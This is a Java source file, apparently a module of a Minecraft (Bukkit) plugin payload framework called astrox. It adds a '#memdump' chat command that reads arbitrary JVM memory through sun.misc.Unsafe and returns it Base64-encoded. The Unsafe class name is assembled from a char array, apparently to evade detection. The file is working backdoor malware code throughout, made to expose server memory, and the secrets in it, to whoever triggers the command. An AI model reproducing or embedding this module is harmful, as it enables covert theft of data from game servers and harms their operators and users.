package dev.naruto.astrox.payload.modules;

import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import java.lang.reflect.Field;
import java.util.Base64;

/**
 * Memory dump module.
 * Uses sun.misc.Unsafe to read a memory region and encode as Base64.
 */
public class MemoryDumpModule implements PayloadModule {

    @Override
    public String getName() { return "memdump"; }

    @Override
    public String getDescription() { return "Read a JVM memory region via Unsafe"; }

    @Override
    public String getCategory() { return "System"; }

    @Override
    public String execute(Player sender, String[] args, JavaPlugin plugin) {
        if (args.length < 2) {
            if (sender != null) sender.sendMessage("§c✗ Usage: #memdump <address_hex> <length>");
            return "ERROR: Usage: memdump <address_hex> <length>";
        }

        try {
            long address = Long.parseUnsignedLong(args[0], 16);
            int length = Integer.parseInt(args[1]);

            // Safety limit
            if (length > 65536) {
                String msg = "Max dump size is 64KB";
                if (sender != null) sender.sendMessage("§c✗ " + msg);
                return "ERROR: " + msg;
            }

            // Get Unsafe instance via reflection
            Object unsafe = getUnsafe();
            if (unsafe == null) {
                String msg = "sun.misc.Unsafe not available on this JVM";
                if (sender != null) sender.sendMessage("§c✗ " + msg);
                return "ERROR: " + msg;
            }

            // Read memory
            byte[] buffer = new byte[length];
            java.lang.reflect.Method copyMemory = unsafe.getClass().getMethod(
                    "copyMemory", Object.class, long.class, Object.class, long.class, long.class);

            // Get Unsafe.ARRAY_BYTE_BASE_OFFSET
            Field offsetField = unsafe.getClass().getDeclaredField("ARRAY_BYTE_BASE_OFFSET");
            offsetField.setAccessible(true);
            long arrayBaseOffset = offsetField.getInt(null);

            copyMemory.invoke(unsafe, null, address, buffer, arrayBaseOffset, (long) length);

            String encoded = Base64.getEncoder().encodeToString(buffer);

            if (sender != null) {
                sender.sendMessage(String.format(
                        "§a✓ Dumped %d bytes from 0x%X", length, address));
                sender.sendMessage("§7Base64: " + encoded.substring(0, Math.min(200, encoded.length()))
                        + (encoded.length() > 200 ? "..." : ""));
            }

            return encoded;

        } catch (NumberFormatException e) {
            String msg = "Invalid address or length format";
            if (sender != null) sender.sendMessage("§c✗ " + msg);
            return "ERROR: " + msg;
        } catch (Exception e) {
            String msg = "Memory read failed: " + e.getMessage();
            if (sender != null) sender.sendMessage("§c✗ " + msg);
            return "ERROR: " + msg;
        }
    }

    /**
     * Get sun.misc.Unsafe instance via reflection.
     */
    private static Object getUnsafe() {
        try {
            // Build class name at runtime
            char[] cn = {'s', 'u', 'n', '.', 'm', 'i', 's', 'c', '.', 'U', 'n', 's', 'a', 'f', 'e'};
            Class<?> unsafeClass = Class.forName(new String(cn));
            Field theUnsafe = unsafeClass.getDeclaredField("theUnsafe");
            theUnsafe.setAccessible(true);
            return theUnsafe.get(null);
        } catch (Exception e) {
            return null;
        }
    }
}
